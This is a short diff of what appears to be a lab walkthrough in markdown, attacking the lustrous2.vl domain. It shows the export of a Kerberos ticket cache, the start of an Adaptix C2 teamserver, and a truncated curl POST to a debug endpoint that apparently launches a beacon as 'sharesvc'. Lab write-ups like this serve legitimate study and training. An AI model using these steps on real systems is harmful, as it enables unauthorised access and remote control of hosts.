@@ -600,7 +600,7 @@ export KRB5CCNAME=ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
 
 Then ill export it
 
-# Be
+# Beacon as `sharesvc`
 
 The next thing ill do is start up adaptix and get logged in to the teamserver
 
@@ -625,3 +625,10 @@ curl -X POST --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Debug' --data "co
 
 Then ill just run the agent
 
+![](Pasted%20image%2020260812205249.png)
+
+I now have a beacon
+
+```python
+
+```
